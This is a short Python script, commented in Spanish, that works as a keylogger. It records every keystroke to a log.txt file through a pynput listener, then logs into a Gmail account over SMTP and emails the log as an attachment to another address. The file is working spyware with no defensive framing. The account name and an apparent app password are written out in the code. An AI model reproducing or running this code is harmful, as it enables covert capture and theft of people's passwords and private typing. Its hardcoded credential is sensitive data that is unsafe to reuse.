from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener
import smtplib
import email.mime.base
import time

keys = []

archivo_txt = "log.txt"


def presionar_tecla(key):

    keys.append(key)       
    convertir_string(keys)

def convertir_string(keys):
    with open(archivo_txt, 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            key = str(key).replace("Key.space", " ")
            key = str(key).replace("Key.ctrl_l", "")
            key = str(key).replace("Key.tab", "")
            key = str(key).replace("Key.alt", "")
            key = str(key).replace("Key.alt_gr", "")
            key = str(key).replace("Key.caps_lock", "")
            key = str(key).replace("Key.enter", "\n")

            
            logfile.write(key)

def soltar_tecla(key):
    if key == Key.esc:
        return False
    
     

with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()


flag = True

if(flag):
    import smtplib
    import email.mime.base

    # Crea la conexión SMTP
    server = smtplib.SMTP('smtp.gmail.com', 587)

    correo = 'naranjotesteos@gmail.com'
    pas ='mewt orpm ppjg qdrw'
    # Inicia sesión en tu cuenta de Gmail


    # Definir el remitente y destinatario del correo electrónico
    remitente = "naranjotesteos@gmail.com"
    destinatario = "naranjo.developer@gmail.com"

    # Crear el mensaje del correo electrónico
    mensaje = email.mime.multipart.MIMEMultipart()
    mensaje['From'] = remitente
    mensaje['To'] = destinatario
    mensaje['Subject'] = "Correo electrónico con archivo adjunto"

    # Añadir el cuerpo del mensaje
    cuerpo = "Hola,\n\nEste es un mensaje de prueba enviado desde Python con un archivo adjunto.\n\nSaludos,\n Kevin"
    mensaje.attach(email.mime.text.MIMEText(cuerpo, 'plain'))

    # Añadir el archivo Excel como adjunto
    ruta_archivo = 'log.txt'
    archivo = open(ruta_archivo, 'rb')
    adjunto = email.mime.base.MIMEBase('application', 'octet-stream')
    adjunto.set_payload((archivo).read())
    email.encoders.encode_base64(adjunto)
    adjunto.add_header('Content-Disposition', "attachment; filename= %s" % ruta_archivo)
    mensaje.attach(adjunto)

    # Convertir el mensaje a texto plano
    texto = mensaje.as_string()

    server.starttls()

    server.login(correo, pas)
    server.sendmail(remitente, destinatario, texto)
    server.quit()   
    time.sleep(10)